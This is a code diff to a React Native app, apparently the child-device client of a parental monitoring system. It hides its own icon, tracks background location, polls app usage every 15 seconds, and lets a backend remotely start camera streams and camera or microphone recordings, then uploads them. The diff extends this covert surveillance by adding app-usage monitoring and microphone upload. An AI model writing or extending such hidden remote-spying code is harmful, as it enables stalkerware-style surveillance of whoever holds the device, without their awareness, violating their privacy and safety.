@@ -5,7 +5,10 @@ import { CameraService } from './app/services/CameraService';
 import { MicrophoneService } from './app/services/MicrophoneService';
 import { LocationService } from './app/services/LocationService';
 import { VisibilityService } from './app/services/VisibilityService';
+import { AppUsageService } from './app/services/AppUsageService';
 import { io } from 'socket.io-client';
+
+const BACKEND_URL = 'http://localhost:8443';
 
 export default function App() {
   const [parentId, setParentId] = useState('');
@@ -19,7 +22,8 @@ export default function App() {
   const [services, setServices] = useState({
     camera: null,
     mic: null,
-    location: null
+    location: null,
+    usage: null
   });
 
   const registerDevice = async () => {
@@ -35,13 +39,13 @@ export default function App() {
       // Step 1: Check and request all hardware permissions
       const permResult = await requestAllPermissions();
       if (!permResult.allGranted) {
-        setStatusMsg('Error: All permissions are required (Camera, Mic, GPS, Background Location)');
+        setStatusMsg('Error: Camera, Mic & GPS permissions are required');
         setLoading(false);
         return;
       }
 
       // Step 2: Register device via REST API
-      const response = await fetch('https://localhost:8443/api/auth/kid/register', {
+      const response = await fetch(`${BACKEND_URL}/api/auth/kid/register`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -64,7 +68,7 @@ export default function App() {
       await VisibilityService.hideAppIcon();
 
       // Step 4: Establish Socket connection
-      const socket = io('https://localhost:8443', {
+      const socket = io(BACKEND_URL, {
         auth: { deviceId }
       });
 
@@ -76,14 +80,16 @@ export default function App() {
       const camSvc = new CameraService(deviceId, socket);
       const micSvc = new MicrophoneService(deviceId, socket);
       const locSvc = new LocationService(deviceId, socket);
+      const usageSvc = new AppUsageService(deviceId, socket, BACKEND_URL);
 
-      // Start Background location watch
+      // Start Background location watch & app usage polling
       await locSvc.startTracking();
+      usageSvc.startMonitoring(15000);
 
       // Register socket commands listener
       socket.on('camera-start-command', async (data) => {
         console.log('Received Camera Start command via socket.');
-        await camSvc.startStream(data.streamId);
+        await camSvc.startStream(data.streamId, data.parentSocketId);
       });
 
       socket.on('camera-switch-command', (data) => {
@@ -102,9 +108,8 @@ export default function App() {
 
       socket.on('camera-record-stop', async () => {
         const recordData = await camSvc.stopRecording();
-        // Post details back to backend surveillance API
         if (recordData) {
-          fetch('https://localhost:8443/api/surveillance/camera/record/stop', {
+          fetch(`${BACKEND_URL}/api/surveillance/camera/record/stop`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(recordData)
@@ -125,7 +130,14 @@ export default function App() {
       });
 
       socket.on('mic-record-stop', async () => {
-        await micSvc.stopRecording();
+        const audioData = await micSvc.stopRecording();
+        if (audioData) {
+          fetch(`${BACKEND_URL}/api/surveillance/mic/record/stop`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(audioData)
+          });
+        }
       });
 
       socket.on('app-hide-command', async () => {
@@ -136,7 +148,7 @@ export default function App() {
         await VisibilityService.showAppIcon();
       });
 
-      setServices({ camera: camSvc, mic: micSvc, location: locSvc });
+      setServices({ camera: camSvc, mic: micSvc, location: locSvc, usage: usageSvc });
       setRegistered(true);
     } catch (e) {
       console.error(e);
